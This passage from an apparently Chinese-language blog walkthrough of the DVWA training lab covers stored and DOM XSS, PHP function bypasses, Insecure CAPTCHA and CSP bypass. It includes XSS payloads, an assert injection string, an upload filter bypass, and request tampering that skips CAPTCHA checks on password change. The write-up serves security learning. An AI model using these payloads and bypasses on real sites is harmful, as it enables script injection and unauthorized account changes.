<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<p>预定义字符包括单引号（’）双引号（”） 反斜杠（\） NULL</p>
<p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签。</p>
</blockquote>
<p>所以基本上只能操作Name</p>
<p>修改元素最大长度后使用双写或者大写绕过</p>
<h3 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h3><p>查看源码，发现message和Medium一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">strip_tags</span>( <span class="title function_ invoke__">addslashes</span>( <span class="variable">$message</span> ) );</span><br></pre></td></tr></table></figure>

<p>对Name如反射型一样使用了preg_replace()过滤了<code>&lt;script&gt;</code>标签</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br></pre></td></tr></table></figure>

<p>操作也一样，使用onload或者onerror</p>
<h2 id="花式绕过"><a href="#花式绕过" class="headerlink" title="花式绕过"></a>花式绕过</h2><p><a href="https://blog.csdn.net/xiayu729100940/article/details/102619255">玩的够花</a></p>
<h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p><code>preg_replace($pattern,$replacement,$subject)</code></p>
<p><code>正则表达式 替换字符串 目标字符串</code></p>
<p>当正则表达式以<code>/e</code>结束时，replacement的值会被当作php函数执行</p>
<p>如<code>preg_replace(&#39;/test/e&#39;,&#39;phpinfo();&#39;,&#39;test&#39;)</code>，此时目标<code>test</code>被替换成<code>phpinfo();</code>并被执行</p>
<h3 id="strip-tags"><a href="#strip-tags" class="headerlink" title="strip_tags"></a>strip_tags</h3><p>当使用thinkphp原生的upload()进行文件上传时，也会使用该函数</p>
<p>当上传php文件遭到过滤时，可以构造<code>1.&lt;a&gt;php</code>，此时可以上传并且会删除标签，成功上传php文件</p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>assert()执行的字符串如果有多条，只会执行第一条</p>
<p><code>assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</code></p>
<p>类似于SQL注入，<code>file=&#39;).phpinfo();//</code>，其中<code>.</code>&#x3D;是连接符</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>通过JavaScript，可以重构整个HTML文档，就是说可以添加，移除等等，对页面的某个东西进行操作时，JavaScript就需要获得对HTML文档中所有元素进行访问的入口。这个入口就是DOM，所以在DOM型的xss漏洞利用中，DOM可以看成是一个访问HTML的标准程序接口。</p>
<h3 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h3><p>点击select，地址栏会出现default&#x3D;english，可以直接修改或者通过抓包修改成xss</p>
<p><img data-src="/../images/DVWA/image-20220914143151578.png" alt="image-20220914143151578"></p>
<h3 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h3><p>查看源码，发现它使用了stripos函数检查default中是否含有<code>&lt;script</code>（不区分大小写）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>此时使用其他标签也不行，此时检查元素可以看到值的位置是</p>
<p><code>&lt;option value=&quot;%3Cbody%20onload=%22alert(%271%27)%22%3E&quot;&gt;&lt;/option&gt;</code></p>
<p>此时可以尝试将value闭合（除了option还有外层select）</p>
<blockquote>
<p><code>&lt;option&gt;&lt;/select&gt;</code>都是双标签，也就是说会识别两个标签之间的语句</p>
</blockquote>
<p><code>&quot;&gt;&lt;/select&gt;&lt;body onload=&quot;alert(&#39;xss&#39;)&quot;&gt;</code>（select必须要闭合，option闭不闭都行）</p>
<h3 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h3><p>查看源码，发现它把default分成两类，除了四个选项的都视作english（白名单）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>因为DOM是不会和后端的服务期进行交互的，它只是利用DOM解析树，而DOM解析树依旧会解析注释符后面的语句，只要解析了就可以成功执行。</p>
<p>所以构建<code>English#&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>就会弹出提示框</p>
<h1 id="10-不安全的验证码（Insecure-CAPTCHA）"><a href="#10-不安全的验证码（Insecure-CAPTCHA）" class="headerlink" title="10.不安全的验证码（Insecure CAPTCHA）"></a>10.不安全的验证码（Insecure CAPTCHA）</h1><h2 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h2><p>CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称</p>
<p>这里所介绍的不安全的验证码漏洞的出现是因为并没有在后台验证验证码的正确与否，</p>
<h2 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h2><p>验证原密码+PDO（防SQL注入）+Check Anti-CSRF token（防CSRF）</p>
<h2 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2><p>随便输一个密码改一下，发现它加载贼慢，发现它尝试调用google验证码的API？</p>
<p>过了一段时间，弹出一个提示，经典“锟斤拷”</p>
<blockquote>
<p>锟斤拷，是一串经常在搜索引擎页面和其他网站上看到的乱码字符。乱码源于GBK字符集和Unicode字符集之间的转换问题。</p>
</blockquote>
<p>可以开代理或者将它的php修改src，将其指向国内的recaptcha</p>
<p>经过实践发现开代理不太行</p>
<p>最终通过访问<code>https://www.google.com/recaptcha/admin/create</code>创建一个v2版本的captcha并替换&#x2F;DVWA&#x2F;config&#x2F;config.inc.php里的公私钥，并且将&#x2F;DVWA&#x2F;external&#x2F;recaptcha&#x2F;recaptchalib.php中所有<code>www.google.com</code>(一共两处)替换成<code>www.recaptcha.net</code>，然后就能够直接显示验证码了。</p>
<p>然后尝试输入密码并确认验证码，发现它提示更改，点击change密码就被修改了</p>
<p>回到题目上，查看源码，发现它把修改密码分成了两步</p>
<p>第一步检查验证码是否正确+确认密码是否等于密码</p>
<p>第二步直接进行密码更新</p>
<p>而区分属于哪一步的操作是通过判断<code>step</code>的值和<code>change</code>是否有值</p>
<p>直接抓包修改step为2跳过验证码，就能够修改成功了</p>
<p><img data-src="/../images/DVWA/image-20220914170334157.png" alt="image-20220914170334157"></p>
<p>（那我前面修理验证码的意义是啥。。）</p>
<h2 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码，它多加了一个<code>passed_captcha</code>，当这个为true且满足Low的条件时才会跳第二步</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if they did stage 1</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$_POST</span>[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123;</span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>抓包修改step的值为2，并添加passed_captcha&#x3D;true重传，发现修改成功</p>
<p><img data-src="/../images/DVWA/image-20220914170652988.png" alt="image-20220914170652988"></p>
<h2 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h2><p>查看源码，发现它取消了step的设定，验证$resp的值（验证码，无法跳过）或另外两个变量<code>g-recaptcha</code>和<code>HTTP_USER_AGENT</code>的值是否等于预定值（故意放水？）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="variable">$resp</span> || </span><br><span class="line">        (</span><br><span class="line">            <span class="variable">$_POST</span>[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">            &amp;&amp; <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    )&#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Ops. Password mismatch</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包修改这两个值，密码修改成功</p>
<p><img data-src="/../images/DVWA/image-20220914171602226.png" alt="image-20220914171602226"></p>
<h1 id="11-绕过内容安全策略（CSP-Bypass）"><a href="#11-绕过内容安全策略（CSP-Bypass）" class="headerlink" title="11.绕过内容安全策略（CSP Bypass）"></a>11.绕过内容安全策略（CSP Bypass）</h1><p><a href="https://blog.csdn.net/qq_38154820/article/details/116246731">CSP浅析与绕过</a></p>
<p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，对网站加载或执行的资源进行安全策略的控制。</p>
<p>CSP是防XSS的利器，开发者通过设置CSP的内容，来规定浏览器可以加载的资源，CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
<p>CSP主要通过下列途径实现</p>
<p>通过响应包头（Response Header）实现</p>
<p><code>Content-Security-policy: default-src &#39;self&#39;; script-src &#39;self&#39; allowed.com; img-src &#39;self&#39; allowed.com; style-src &#39;self&#39;;</code></p>
<p>通过HTML 元标签实现</p>
<p><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参数说明：</span><br><span class="line">script-src：外部脚本</span><br><span class="line">style-src：样式表</span><br><span class="line">img-src：图像</span><br><span class="line">media-src：媒体文件（音频和视频）</span><br><span class="line">font-src：字体文件</span><br><span class="line">object-src：插件（比如 Flash）</span><br><span class="line">child-src：框架</span><br><span class="line">frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</span><br><span class="line">connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</span><br><span class="line">worker-src：worker脚本</span><br><span class="line">manifest-src：manifest 文件</span><br><span class="line">dedault-src：默认配置</span><br><span class="line">frame-ancestors：限制嵌入框架的网页</span><br><span class="line">base-uri：限制&lt;base#href&gt;</span><br><span class="line">form-action：限制&lt;form#action&gt;</span><br><span class="line">block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</span><br><span class="line">upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</span><br><span class="line">plugin-types：限制可以使用的插件格式</span><br><span class="line">sandbox：浏览器行为的限制，比如不能有弹出窗口等。</span><br></pre></td></tr></table></figure>

<p>除了Content-Security-Policy，还有一个Content-Security-Policy-Report-Only字段，表示不执行限制选项，只是记录违反限制的行为。它必须与report-uri选项配合使用。</p>
<p><code>Content-Security-Policy-Report-Only: default-src &#39;self&#39;; ...; report-uri /my_amazing_csp_report_parser;</code></p>
<p>指令值:</p>
<p>*：星号表示允许任何URL资源，没有限制；</p>
<p>self：表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</p>
<p>data：仅允许数据模式（如Base64编码的图片）方式加载资源；</p>
<p>none：不允许任何资源被加载；</p>
<p>unsafe-inline：允许使用内联资源，例如内联<code>&lt;script&gt;</code>标签，内联事件处理器，内联<code>&lt;style&gt;</code>标签等，但出于安全考虑，不建议使用；</p>
<p>nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；</p>
<p><a href="https://www.cnblogs.com/ZZupdate/p/14998710.html">常见绕过方法</a></p>
<p><a href="https://blog.csdn.net/qq_38154820/article/details/116246731">CSP绕过</a></p>
<h2 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h2><p>谨慎的设置内容安全策略，减少外部网站的引用策略。</p>
<h2 id="Low-12"><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2><p><img data-src="/../images/DVWA/image-20220915091912805.png" alt="image-20220915091912805"></p>
<p>查看源码或者使用CSP Evaluator扩展可以看到同源策略，发现有6个网址的资源可以被执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com;</span><br></pre></td></tr></table></figure>

<p>在这几个网址里写一个js并生成网址，然后Include，发现js被执行</p>
<p><img data-src="/../images/DVWA/image-20220915093135049.png" alt="image-20220915093135049"></p>
<p>这里需要用raw（原生）形式来展现</p>
<p><img data-src="/../images/DVWA/image-20220915093147221.png" alt="image-20220915093147221"></p>
<p>这里chrome会报错显示Indicate whether to send a cookie in a cross-site request by specifying its SameSite attribute</p>
<p>这是chrome 更新以后出现的问题，主要是为了防止CSRF 攻击，屏蔽了第三方cookies。。</p>
<p>可以回退浏览器降到79 及以下版本</p>
<p>修改<code>same-site-by-default-cookies</code>及<code>cookies-without-same-site-must-be-secure</code>的配置为Disabled后重启服务器</p>
<p>也会报脚本因 Mime 类型不匹配而被阻止</p>
<p>这里换了一个网站生成网址就可以了</p>
<p><img data-src="/../images/DVWA/image-20220915102407559.png" alt="image-20220915102407559"></p>
<p><img data-src="/../images/DVWA/image-20220915102428165.png" alt="image-20220915102428165"></p>
<h2 id="Medium-12"><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2><p>发现它有一个<code>unsafe-inline</code>和<code>nonce-xx</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;</span><br></pre></td></tr></table></figure>

<p>只需要把js中加一个<code>nonce</code>参数，值为后续字符就能执行js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/DVWA/image-20220915102712297.png" alt="image-20220915102712297"></p>
<h2 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h2><p><img data-src="/../images/DVWA/image-20220915102746046.png" alt="image-20220915102746046"></p>
<p>这里只有一个<code>self</code></p>
<p>查看源码可以看到本题逻辑</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>它点击后会生成一个script元素，指向<code>source/jsonp.php?callback=solveSum</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">function clickButton() &#123;</span><br><span class="line">    var s = document.createElement(&quot;script&quot;);</span><br><span class="line">    s.src = &quot;source/jsonp.php?callback=solveSum&quot;;</span><br><span class="line">    document.body.appendChild(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function solveSum(obj) &#123;</span><br><span class="line">    if (&quot;answer&quot; in obj) &#123;</span><br><span class="line">        document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var solve_button = document.getElementById (&quot;solve&quot;);</span><br><span class="line"></span><br><span class="line">if (solve_button) &#123;</span><br><span class="line">    solve_button.addEventListener(&quot;click&quot;, function() &#123;</span><br><span class="line">        clickButton();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而solveSum是一个js函数</p>
<p>那就可以直接替换成js代码执行（抓包修改就行）</p>
<p><img data-src="/../images/DVWA/image-20220915103255108.png" alt="image-20220915103255108"></p>
<p><img data-src="/../images/DVWA/image-20220915103225835.png" alt="image-20220915103225835"></p>
<h1 id="12-前端攻击（Javascript-Attacks）"><a href="#12-前端攻击（Javascript-Attacks）" class="headerlink" title="12.前端攻击（Javascript Attacks）"></a>12.前端攻击（Javascript Attacks）</h1><h2 id="介绍-9"><a href="#介绍-9" class="headerlink" title="介绍"></a>介绍</h2><p>JavaScript是一种基于对象和事件驱动的、并具有安全性能的脚本语言。是一种解释型语言（代码不需要进行预编译）。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。</p>
<p>若是涉及到Cookie、Session等记录用户信息的脚本，应该通过外部引入方式，并且不能暴露文件路径，控制好文件访问权限，若被攻击者获取到重要脚本代码，则能伪造其他合法用户进行伪造。</p>
<h2 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h2><p>外部引入脚本，不暴露文件路径，控制文件访问权限</p>
<h2 id="Low-13"><a href="#Low-13" class="headerlink" title="Low"></a>Low</h2><p><img data-src="/../images/DVWA/image-20220915103542257.png" alt="image-20220915103542257"></p>
<p>输入<code>win</code>提示<code>You got the phrase wrong</code>，输入<code>success</code>提示<code>Invalid token</code>？</p>
<p><img data-src="/../images/DVWA/image-20220915103852926.png" alt="image-20220915103852926"></p>
<p><img data-src="/../images/DVWA/image-20220915104002130.png" alt="image-20220915104002130"></p>
<p>查看源码发现我们输入的<code>phrase</code>进行rot13替换后md5加密后变成了token</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> phrase = document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;phrase&quot;</span>).value;</span><br><span class="line">        document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;token&quot;</span>).value = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rot13</span>(phrase));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
